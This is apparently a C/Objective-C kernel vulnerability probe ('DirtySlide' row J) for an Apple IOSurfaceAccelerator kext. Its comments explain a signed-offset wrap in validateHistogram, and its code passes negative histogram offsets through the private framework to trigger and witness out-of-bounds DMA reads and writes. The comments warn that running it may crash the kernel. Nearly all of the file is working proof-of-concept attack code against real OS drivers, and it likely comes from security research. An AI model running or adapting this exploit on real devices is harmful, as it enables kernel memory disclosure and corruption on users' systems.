//  probe_iosa_hist.m - DirtySlide ROW J: M2SCALER-CSC HISTOGRAM WRAP (v173)
//  THE STATIC CHAIN (Ghidra 09-02, kext 905.40.1, both filter generations):
//    IosaColorManagerMSR4.cpp:246  (26.6)  -> FUN_fffffff008db70f8
//    IosaColorManagerMSR23.cpp:874 (26.6.1) -> FUN_fffffff008dc0ec4
//    validateHistogram(ctx): Bw=*(u32*)(desc+0x20) Bh=*(u32*)(desc+0x24) = the REAL
//    surface dims; Hw=*(u32*)(ctx+0xbe0) Hh=*(u32*)(ctx+0xbe4) = the CLIENT
//    HistogramWidth/Height; Hx=*(int*)(ctx+0xbd8) Hy=*(int*)(ctx+0xbdc) = the CLIENT
//    HistogramOffsetX/Y AS SIGNED INTs; the gate is
//        if (Bw < (u32)(Hx + Hw) || Bh < (u32)(Hy + Hh)) reject;
//    a NEGATIVE offset wraps the 32-bit sum small and PASSES: Hx=-16, Hw=1920 ->
//    sum=1904 < 1920 -> accepted with the HW histogram rect starting 16px BEFORE
//    the surface base = OOB DMA read; the bins are client-readable (sel7
//    GetHistogram + the kIOSurfaceAcceleratorHistogramPixelBins dst attachment).
//    The mismatch case (HistDim != DstDim) only SETS a flag (ctx+0x1fd5), never
//    rejects. The kext's own testHistogram drives the exact same client path with
//    the same 5 option keys = the feature is live code, not dead.
//  v173 = the EMPIRICAL PROOF ROW (all direct-UC wrapper calls, ZERO daemon epoch):
//    JH01 in-bounds control -> JH02 WRAP-X (-16) -> JH03 WRAP-Y (-8) ->
//    JH04 BIG-WRAP (-2^28, the truncation probe) -> JH05 OOB control (must REJECT)
//    -> JH06 mode-0 control (must REJECT). Every wrap cell: dst diff = the
//    execution witness, A/C sentinels around the dst = the OOB WRITE witness,
//    GetHistogram bins hash vs the JH01 baseline = the OOB READ witness.
//  A PANIC on any JH cell = THE 64747 WRITE. MAY CRASH KERNEL.
#include "ds_core.h"

/* ---- IOSurfaceAccelerator via dlopen (the v165-proven loader) ---- */
typedef void *jh_acc_t;
typedef kern_return_t (*jh_pCreate)(CFAllocatorRef, CFDictionaryRef, jh_acc_t *);
typedef kern_return_t (*jh_pXfer)(jh_acc_t, IOSurfaceRef, IOSurfaceRef, CFDictionaryRef);
typedef kern_return_t (*jh_pHist)(jh_acc_t, uint32_t *);

static jh_acc_t jh_acc;
static void *jh_hIA, *jh_hIS;
static jh_pCreate jh_create;
static jh_pXfer jh_xfer;
static jh_pHist jh_hist;

static const char *jh_kr(kern_return_t k)
{
    switch (k) {
    case 0: return "SUCCESS";
    case 0xe00002c2: return "BadArgument";
    case 0xe00002c1: return "NotPermitted";
    case 0xe00002bd: return "NoResources";
    case 0xe00002c0: return "NoDevice";
    case 0xe00002c5: return "ExclusiveAccess";
    case 0xe00002c7: return "Unsupported";
    case 0xe00002ea: return "Timeout";
    default: return "?";
    }
}

/* v166 G10 pattern: dlsym'd CFStringRef exports are VARIABLES - deref + validate */
static CFStringRef jh_cfstr(const char *name)
{
    void *kv = dlsym(jh_hIA, name);
    if (!kv) kv = dlsym(jh_hIS, name);
    if (!kv) return NULL;
    CFStringRef s = *(CFStringRef *)kv;
    if (!s || CFGetTypeID(s) != CFStringGetTypeID()) return NULL;
    return s;
}

static CVReturn jh_make_pb(int w, int h, OSType fmt, CVPixelBufferRef *out)
{
    CFMutableDictionaryRef attrs = CFDictionaryCreateMutable(kCFAllocatorDefault, 0,
        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    CFMutableDictionaryRef iosProps = CFDictionaryCreateMutable(kCFAllocatorDefault, 0,
        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    CVReturn cr = -1;
    if (attrs && iosProps) {
        CFDictionarySetValue(attrs, kCVPixelBufferIOSurfacePropertiesKey, iosProps);
        cr = CVPixelBufferCreate(NULL, (size_t)w, (size_t)h, fmt, attrs, out);
    }
    if (attrs) CFRelease(attrs);
    if (iosProps) CFRelease(iosProps);
    return cr;
}

/* flat fill (sentinels + dst) */
static int jh_fill(CVPixelBufferRef pb, const char *tag, uint8_t v)
{
    if (CVPixelBufferLockBaseAddress(pb, 0) != 0) return -1;
    size_t npl = CVPixelBufferGetPlaneCount(pb);
    if (npl == 0) {
        void *b = CVPixelBufferGetBaseAddress(pb);
        if (b) memset(b, v, CVPixelBufferGetBytesPerRow(pb) * CVPixelBufferGetHeight(pb));
    } else {
        for (size_t p = 0; p < npl; p++) {
            void *b = CVPixelBufferGetBaseAddressOfPlane(pb, p);
            if (b) memset(b, v, CVPixelBufferGetBytesPerRowOfPlane(pb, p) * CVPixelBufferGetHeightOfPlane(pb, p));
        }
    }
    CVPixelBufferUnlockBaseAddress(pb, 0);
    (void)tag;
    return 0;
}

/* POSITION-SENSITIVE gradient fill: the bins must encode source position so a
 * wrapped rect reading pixels OUTSIDE the surface produces bins the in-bounds
 * rect can never produce */
static int jh_fill_grad(CVPixelBufferRef pb, const char *tag, uint8_t seed)
{
    if (CVPixelBufferLockBaseAddress(pb, 0) != 0) return -1;
    size_t npl = CVPixelBufferGetPlaneCount(pb);
    if (npl == 0) {
        void *b = CVPixelBufferGetBaseAddress(pb);
        size_t bpr = CVPixelBufferGetBytesPerRow(pb);
        size_t h = CVPixelBufferGetHeight(pb);
        for (size_t y = 0; y < h; y++) {
            uint8_t *row = (uint8_t *)b + y * bpr;
            for (size_t x = 0; x < bpr; x++) row[x] = (uint8_t)(seed + y * 3 + x * 5);
        }
    } else {
        for (size_t p = 0; p < npl; p++) {
            void *b = CVPixelBufferGetBaseAddressOfPlane(pb, p);
            size_t bpr = CVPixelBufferGetBytesPerRowOfPlane(pb, p);
            size_t h = CVPixelBufferGetHeightOfPlane(pb, p);
            for (size_t y = 0; y < h; y++) {
                uint8_t *row = (uint8_t *)b + y * bpr;
                for (size_t x = 0; x < bpr; x++) row[x] = (uint8_t)(seed + y * 3 + x * 5);
            }
        }
    }
    CVPixelBufferUnlockBaseAddress(pb, 0);
    (void)tag;
    return 0;
}

/* count bytes != v, report first/last (the execution + shape witness) */
static long jh_diff(CVPixelBufferRef pb, const char *name, const char *pfx, const char *tag,
                    long *first, long *last)
{
    *first = *last = -1;
    long n = 0;
    if (CVPixelBufferLockBaseAddress(pb, 0) != 0) return -1;
    size_t npl = CVPixelBufferGetPlaneCount(pb);
    for (size_t p = 0; p < (npl ? npl : 1); p++) {
        void *b = npl ? CVPixelBufferGetBaseAddressOfPlane(pb, p) : CVPixelBufferGetBaseAddress(pb);
        size_t bpr = npl ? CVPixelBufferGetBytesPerRowOfPlane(pb, p) : CVPixelBufferGetBytesPerRow(pb);
        size_t h = npl ? CVPixelBufferGetHeightOfPlane(pb, p) : CVPixelBufferGetHeight(pb);
        if (!b) continue;
        long off = 0;
        for (size_t y = 0; y < h; y++) {
            uint8_t *row = (uint8_t *)b + y * bpr;
            for (size_t x = 0; x < bpr; x++, off++) {
                if (row[x] != 0x41) {
                    if (n == 0) *first = off;
                    *last = off;
                    n++;
                }
            }
        }
    }
    CVPixelBufferUnlockBaseAddress(pb, 0);
    dprintf(STDOUT_FILENO, "%s  J[%s] diff %s: %ld bytes first=%ld last=%ld\n", pfx, tag, name, n, *first, *last);
    return n;
}

/* FNV-1a over a buffer */
static uint64_t jh_hash(const void *b, size_t n)
{
    uint64_t h = 0xcbf29ce484222325ULL;
    const uint8_t *p = (const uint8_t *)b;
    for (size_t i = 0; i < n; i++) { h ^= p[i]; h *= 0x100000001b3ULL; }
    return h;
}

static int jh_ensure_acc(const char *pfx, const char *tag)
{
    if (jh_acc) return 0;
    if (!jh_create) return -1;
    kern_return_t kr = jh_create(NULL, NULL, &jh_acc);
    dprintf(STDOUT_FILENO, "%s  J[%s] acc create kr=%s (%d) acc=%p\n", pfx, tag, jh_kr(kr), kr, jh_acc);
    if (kr != 0 || !jh_acc) { jh_acc = NULL; return -1; }
    return 0;
}

/* GetHistogram readback: buf[0] = count (registry), bins land at buf+4 (wired
 * pointer the wrapper passes in the sel7 struct). Returns the bins hash. */
static uint64_t jh_read_bins(const char *pfx, const char *tag, uint8_t *buf, size_t bufLen,
                             kern_return_t *krOut, int *sigOut)
{
    memset(buf, 0, bufLen);
    int rc = 0;
    __block kern_return_t kr = -1;
    *sigOut = ds_ave_guard_run_tmo(^int {
        kr = jh_hist ? jh_hist(jh_acc, (uint32_t *)buf) : -1;
        return 0;
    }, &rc, 6000);
    *krOut = kr;
    if (*sigOut == SIGALRM) {
        dprintf(STDOUT_FILENO, "%s  J[%s] GetHistogram TIMEOUT (6s)\n", pfx, tag);
        return 0;
    }
    if (*sigOut > 0) {
        dprintf(STDOUT_FILENO, "%s  J[%s] GetHistogram CLIENT-FAULT sig=%d @0x%lx\n", pfx, tag,
                *sigOut, (unsigned long)g_ave_fault_addr);
        return 0;
    }
    dprintf(STDOUT_FILENO, "%s  J[%s] GetHistogram kr=%s (%d) count=%u bins=%08x %08x %08x %08x\n",
            pfx, tag, jh_kr(kr), kr, *(uint32_t *)buf,
            *(uint32_t *)(buf + 4), *(uint32_t *)(buf + 8),
            *(uint32_t *)(buf + 12), *(uint32_t *)(buf + 16));
    return jh_hash(buf + 4, bufLen - 4 - 0x40);
}

/* the histogram pixel-bins ATTACHMENT on the dst (the second readback channel) */
static void jh_read_attachment(const char *pfx, const char *tag, IOSurfaceRef dst)
{
    CFStringRef k = jh_cfstr("kIOSurfaceAcceleratorHistogramPixelBins");
    if (!k || !dst) {
        dprintf(STDOUT_FILENO, "%s  J[%s] attach: key=%p dst=%p (missing)\n", pfx, tag, (void *)k, (void *)dst);
        return;
    }
    CFTypeRef v = IOSurfaceCopyValue(dst, k);
    if (!v) {
        dprintf(STDOUT_FILENO, "%s  J[%s] attach: NO HistogramPixelBins value on dst\n", pfx, tag);
        return;
    }
    CFTypeID tid = CFGetTypeID(v);
    if (tid == CFDataGetTypeID()) {
        CFDataRef d = (CFDataRef)v;
        const uint8_t *p = CFDataGetBytePtr(d);
        CFIndex n = CFDataGetLength(d);
        dprintf(STDOUT_FILENO, "%s  J[%s] attach: CFData %ld bytes hash=%016llx head=%02x%02x%02x%02x\n",
                pfx, tag, (long)n, (unsigned long long)jh_hash(p, (size_t)n),
                n > 0 ? p[0] : 0, n > 1 ? p[1] : 0, n > 2 ? p[2] : 0, n > 3 ? p[3] : 0);
    } else {
        dprintf(STDOUT_FILENO, "%s  J[%s] attach: CFTypeID=%lu (non-data)\n", pfx, tag, (unsigned long)tid);
    }
    CFRelease(v);
}

/* THE CELL RUNNER: one transfer + full readback matrix.
 * offx/offy are the raw client offsets (SInt32 - negatives are the point);
 * hw/hh the histogram w/h; mode the HistogramBinMode. */
static void ds_jh_cell(const char *pfx, const char *tag, const char *note,
                       int32_t offx, int32_t offy, int32_t hw, int32_t hh, int32_t mode,
                       int withSentinels)
{
    char stag[48];
    snprintf(stag, sizeof(stag), "M2H %s", tag);
    ds_journal_write("START", stag);
    dprintf(STDOUT_FILENO, "%s== JH %s ==\n", pfx, tag);
    dprintf(STDOUT_FILENO, "%s  J[%s] %s\n", pfx, tag, note);
    dprintf(STDOUT_FILENO, "%s  J[%s] opts {BinMode:%d OffsetX:%d OffsetY:%d Width:%d Height:%d} | "
            "validate math: 1920 < (u32)(%d+%d)=%u -> %s | 1080 < (u32)(%d+%d)=%u -> %s\n",
            pfx, tag, mode, offx, offy, hw, hh,
            offx, hw, (uint32_t)(offx + hw),
            ((uint32_t)1920 < (uint32_t)(offx + hw)) ? "REJECT" : "PASS",
            offy, hh, (uint32_t)(offy + hh),
            ((uint32_t)1080 < (uint32_t)(offy + hh)) ? "REJECT" : "PASS");
    if (jh_ensure_acc(pfx, tag) != 0) {
        dprintf(STDOUT_FILENO, "%s  J[%s] NO ACCELERATOR - cell void\n", pfx, tag);
        ds_journal_write("DONE", "JH no-acc");
        return;
    }
    CVPixelBufferRef s = NULL, d = NULL, sa = NULL, sc = NULL;
    CVReturn c1 = jh_make_pb(1920, 1080, kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange, &s);
    CVReturn c2 = jh_make_pb(1920, 1080, kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange, &d);
    CVReturn c3 = 0, c4 = 0;
    if (withSentinels) {
        c3 = jh_make_pb(1920, 32, kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange, &sa);
        c4 = jh_make_pb(1920, 32, kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange, &sc);
    }
    if (c1 || c2 || c3 || c4 || !s || !d || (withSentinels && (!sa || !sc))) {
        dprintf(STDOUT_FILENO, "%s  J[%s] surfaces FAILED (%d %d %d %d)\n", pfx, tag, c1, c2, c3, c4);
        if (s) CVBufferRelease(s); if (d) CVBufferRelease(d);
        if (sa) CVBufferRelease(sa); if (sc) CVBufferRelease(sc);
        ds_journal_write("DONE", "JH pb-fail");
        return;
    }
    jh_fill_grad(s, tag, 0x10);
    jh_fill(d, tag, 0x41);
    if (withSentinels) { jh_fill(sa, tag, 0x41); jh_fill(sc, tag, 0x41); }
    IOSurfaceRef sIos = CVPixelBufferGetIOSurface(s);
    IOSurfaceRef dIos = CVPixelBufferGetIOSurface(d);
    dprintf(STDOUT_FILENO, "%s  J[%s] srcIOS id=%u (gradient 0x10+) dstIOS id=%u (0x41)%s\n",
            pfx, tag, sIos ? IOSurfaceGetID(sIos) : 0, dIos ? IOSurfaceGetID(dIos) : 0,
            withSentinels ? " + A/C sentinels" : "");

    /* the options dict - created CFStrings (CFEqual content-match, the m2-raw-cell
     * proven pattern; the dlsym check only REPORTS the export availability) */
    CFMutableDictionaryRef opts = CFDictionaryCreateMutable(kCFAllocatorDefault, 0,
        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    struct { const char *nm; int32_t v; int exported; } kv[5] = {
        { "kIOSurfaceAcceleratorHistogramBinMode", mode, 0 },
        { "kIOSurfaceAcceleratorHistogramOffsetX", offx, 0 },
        { "kIOSurfaceAcceleratorHistogramOffsetY", offy, 0 },
        { "kIOSurfaceAcceleratorHistogramWidth", hw, 0 },
        { "kIOSurfaceAcceleratorHistogramHeight", hh, 0 },
    };
    int nkeys = 0;
    for (int i = 0; i < 5; i++) {
        if (jh_cfstr(kv[i].nm)) kv[i].exported = 1;
        CFStringRef k = CFStringCreateWithCString(kCFAllocatorDefault, kv[i].nm + strlen("kIOSurfaceAccelerator"),
                                                  kCFStringEncodingUTF8);
        CFNumberRef n = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &kv[i].v);
        if (k && n) { CFDictionarySetValue(opts, k, n); nkeys++; }
        if (k) CFRelease(k);
        if (n) CFRelease(n);
    }
    dprintf(STDOUT_FILENO, "%s  J[%s] opts dict=%p keys=%d/5 exports{mode:%d x:%d y:%d w:%d h:%d}\n",
            pfx, tag, (void *)opts, nkeys, kv[0].exported, kv[1].exported, kv[2].exported,
            kv[3].exported, kv[4].exported);

    int sig = 0, rc = 0;
    __block kern_return_t kr = -1;
    uint64_t t0 = mach_absolute_time();
    sig = ds_ave_guard_run_tmo(^int {
        kr = jh_xfer(jh_acc, sIos, dIos, opts);
        return 0;
    }, &rc, 8000);
    double tMs = ds_ave_elapsed_ms(t0);
    if (sig == SIGALRM)
        dprintf(STDOUT_FILENO, "%s  J[%s] TIMEOUT (8s) t=%.0fms = UC STUCK\n", pfx, tag, tMs);
    else if (sig > 0)
        dprintf(STDOUT_FILENO, "%s  J[%s] CLIENT-FAULT sig=%d @0x%lx t=%.0fms\n", pfx, tag,
                sig, (unsigned long)g_ave_fault_addr, tMs);
    else
        dprintf(STDOUT_FILENO, "%s  J[%s] TransferSurface kr=%s (%d) t=%.0fms\n", pfx, tag,
                jh_kr(kr), kr, tMs);

    if (sig == 0 && kr == 0) {
        usleep(1500000);   /* the v169 async lesson: give the HW the window */
        long f1 = 0, l1 = 0;
        long dDst = jh_diff(d, "dst", pfx, tag, &f1, &l1);
        if (withSentinels) {
            long f2 = 0, l2 = 0, f3 = 0, l3 = 0;
            long dA = jh_diff(sa, "A(pre)", pfx, tag, &f2, &l2);
            long dC = jh_diff(sc, "C(post)", pfx, tag, &f3, &l3);
            if (dA > 0 || dC > 0)
                dprintf(STDOUT_FILENO, "%s  J[%s] *** OOB WRITE PROVEN (A=%ld C=%ld) = THE 64747 WRITE ***\n",
                        pfx, tag, dA, dC);
        }
        static uint8_t bins[0x1000];
        kern_return_t khist = -1;
        int shist = 0;
        uint64_t bh = jh_read_bins(pfx, tag, bins, sizeof(bins), &khist, &shist);
        static uint64_t s_baseHash;
        static int s_haveBase;
        if (strcmp(tag, "JH01") == 0) { s_baseHash = bh; s_haveBase = 1; }
        if (s_haveBase)
            dprintf(STDOUT_FILENO, "%s  J[%s] BINS-HASH %016llx vs JH01 base %016llx = %s\n",
                    pfx, tag, (unsigned long long)bh, (unsigned long long)s_baseHash,
                    (bh == s_baseHash) ? "SAME" : "*** DIFFERENT - pixels outside the in-bounds set accumulated ***");
        jh_read_attachment(pfx, tag, dIos);
    }
    if (opts) CFRelease(opts);
    CVBufferRelease(s);
    CVBufferRelease(d);
    if (sa) CVBufferRelease(sa);
    if (sc) CVBufferRelease(sc);
    ds_journal_write("DONE", stag);
}

/* ------------------------------------------------------------------ */
void probe_iosa_hist(const char *pfx)
{
    dprintf(STDOUT_FILENO, "%s== J. M2HIST-WRAP 64747 (v173 - THE SIGNED-OFFSET WRAP, R/W proof row) ==\n", pfx);
    dprintf(STDOUT_FILENO, "%s  STATIC CHAIN (Ghidra 09-02): the kext histogram rect gate in BOTH filter\n", pfx);
    dprintf(STDOUT_FILENO, "%s  generations reads the client HistogramOffsetX/Y as SIGNED int and tests\n", pfx);
    dprintf(STDOUT_FILENO, "%s  Bw < (u32)(Hx+Hw) || Bh < (u32)(Hy+Hh) against the REAL surface dims -\n", pfx);
    dprintf(STDOUT_FILENO, "%s  a negative offset WRAPS the sum and passes: {-16, W=1920} -> 1904 < 1920\n", pfx);
    dprintf(STDOUT_FILENO, "%s  = accepted with the HW rect starting 16px BEFORE the surface. MSR4.cpp:246\n", pfx);
    dprintf(STDOUT_FILENO, "%s  AND the 26.6.1-new MSR23.cpp:874 share the bug. Mismatch only sets ctx+0x1fd5\n", pfx);
    dprintf(STDOUT_FILENO, "%s  (flag, not reject). Bins are client-readable: sel7 GetHistogram + the dst\n", pfx);
    dprintf(STDOUT_FILENO, "%s  HistogramPixelBins attachment. The kext's own testHistogram rides the same\n", pfx);
    dprintf(STDOUT_FILENO, "%s  path with the same 5 keys = live code. src = POSITION-GRADIENT so OOB pixels\n", pfx);
    dprintf(STDOUT_FILENO, "%s  can never produce the in-bounds bin set. Every cell = readback. PULL THE\n", pfx);
    dprintf(STDOUT_FILENO, "%s  KERNEL LOG: grep 'Invalid histogram' + 'histogramRequest' + validateHistogram.\n", pfx);
    dprintf(STDOUT_FILENO, "%s  A PANIC on any JH cell = THE 64747 WRITE.\n", pfx);

    jh_hIA = dlopen("/System/Library/PrivateFrameworks/IOSurfaceAccelerator.framework/IOSurfaceAccelerator", RTLD_LAZY);
    jh_hIS = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_LAZY);
    void *h1 = jh_hIA ? jh_hIA : jh_hIS;
    dprintf(STDOUT_FILENO, "%s  J[load] IOSurfaceAccelerator fw=%p IOSurface=%p\n", pfx, jh_hIA, jh_hIS);
    jh_create = (jh_pCreate)dlsym(h1, "IOSurfaceAcceleratorCreate");
    jh_xfer = (jh_pXfer)dlsym(h1, "IOSurfaceAcceleratorTransferSurface");
    jh_hist = (jh_pHist)dlsym(h1, "IOSurfaceAcceleratorGetHistogram");
    dprintf(STDOUT_FILENO, "%s  J[load] create=%p xfer=%p hist=%p\n", pfx, (void *)jh_create, (void *)jh_xfer, (void *)jh_hist);
    dprintf(STDOUT_FILENO, "%s  J[load] key exports: mode=%p offx=%p offy=%p w=%p h=%p bins=%p\n", pfx,
            (void *)jh_cfstr("kIOSurfaceAcceleratorHistogramBinMode"),
            (void *)jh_cfstr("kIOSurfaceAcceleratorHistogramOffsetX"),
            (void *)jh_cfstr("kIOSurfaceAcceleratorHistogramOffsetY"),
            (void *)jh_cfstr("kIOSurfaceAcceleratorHistogramWidth"),
            (void *)jh_cfstr("kIOSurfaceAcceleratorHistogramHeight"),
            (void *)jh_cfstr("kIOSurfaceAcceleratorHistogramPixelBins"));
    if (!jh_create || !jh_xfer || !jh_hist) {
        dprintf(STDOUT_FILENO, "%s  J[load] missing core syms - row void\n", pfx);
        return;
    }

    /* JH00: the readback oracle works standalone (capability + state probe) */
    {
        const char *tag = "JH00";
        ds_journal_write("START", "M2H JH00");
        dprintf(STDOUT_FILENO, "%s== JH %s ==\n", pfx, tag);
        dprintf(STDOUT_FILENO, "%s  J[%s] GetHistogram BEFORE any transfer (state + capability probe)\n", pfx, tag);
        if (jh_ensure_acc(pfx, tag) == 0) {
            static uint8_t bins[0x1000];
            kern_return_t khist = -1;
            int shist = 0;
            jh_read_bins(pfx, tag, bins, sizeof(bins), &khist, &shist);
        }
        ds_journal_write("DONE", "M2H JH00");
    }

    /* JH01: the IN-BOUNDS control - the baseline bins every wrap cell compares to */
    ds_jh_cell(pfx, "JH01", "BASELINE: in-bounds histogram {0,0,1920,1080} mode1 (must PASS + execute)", 0, 0, 1920, 1080, 1, 1);
    /* JH02: THE WRAP-X - negative offset, sum wraps, validator passes, rect starts -16 */
    ds_jh_cell(pfx, "JH02", "THE WRAP-X: {-16,0,1920,1080} - u32 sum 1904 < 1920 = PASSES with the rect OUTSIDE", -16, 0, 1920, 1080, 1, 1);
    /* JH03: the WRAP-Y */
    ds_jh_cell(pfx, "JH03", "THE WRAP-Y: {0,-8,1920,1080} - u32 sum 1072 < 1080 = PASSES, rows ABOVE the surface", 0, -8, 1920, 1080, 1, 1);
    /* JH04: the BIG-WRAP - 2^28 class; the HW field truncation probe */
    ds_jh_cell(pfx, "JH04", "BIG-WRAP: {X=-268435456, W=268435472} - u32 sum = 16 = PASSES; the HW field width decides", -268435456, 0, 268435472, 1080, 1, 1);
    /* JH05: the OOB control - genuinely outside, must REJECT (the gate is live) */
    ds_jh_cell(pfx, "JH05", "OOB CONTROL: {X=2000, W=64} - sum 2064 > 1920 = must REJECT (kext logs 'Invalid histogram')", 2000, 0, 64, 1080, 1, 1);
    /* JH06: the mode control - mode 0 fails the 1U<2 window */
    ds_jh_cell(pfx, "JH06", "MODE CONTROL: BinMode=0 - fails the (mode-1U)<2 window = must REJECT", 0, 0, 1920, 1080, 0, 0);

    for (int bh = 1; bh <= 2; bh++) {
        char htag[16];
        snprintf(htag, sizeof(htag), "JH%02d beat", bh);
        ds_ave_replay(pfx, htag, 1, 1, 64, kCMVideoCodecType_H264, kCVPixelFormatType_32BGRA, 1, 1);
        usleep(500000);
    }

    dprintf(STDOUT_FILENO, "%s  J read-offs:\n", pfx);
    dprintf(STDOUT_FILENO, "%s   JH01 = the in-bounds control: kr=SUCCESS + dst diff >0 (executed) + bins\n", pfx);
    dprintf(STDOUT_FILENO, "%s   baseline recorded. Every later cell's BINS-HASH compares to it.\n", pfx);
    dprintf(STDOUT_FILENO, "%s   JH02/JH03/JH04 kr=SUCCESS with BINS-HASH != base = pixels OUTSIDE the\n", pfx);
    dprintf(STDOUT_FILENO, "%s   in-bounds set accumulated = THE OOB DMA READ WITNESSED (the wrap is real).\n", pfx);
    dprintf(STDOUT_FILENO, "%s   BINS-HASH == base = the wrap passed validate but the HW clamped (the field\n", pfx);
    dprintf(STDOUT_FILENO, "%s   truncation defense) - pull the kernel log for the validator receipt.\n", pfx);
    dprintf(STDOUT_FILENO, "%s   A/C sentinel diffs >0 anywhere = THE OOB WRITE = THE 64747.\n", pfx);
    dprintf(STDOUT_FILENO, "%s   JH05/JH06 must REJECT (BadArgument + the kext 'Invalid histogram' log line) -\n", pfx);
    dprintf(STDOUT_FILENO, "%s   their rejection is what makes the JH02-04 passes mean WRAP, not NO-GATE.\n", pfx);
    dprintf(STDOUT_FILENO, "%s   A TIMEOUT/PANIC on any JH cell = the HW consumed a wild rect = escalate.\n", pfx);
    dprintf(STDOUT_FILENO, "%s  sweep done - .ips captureTime <-> [stamp]\n", pfx);
}
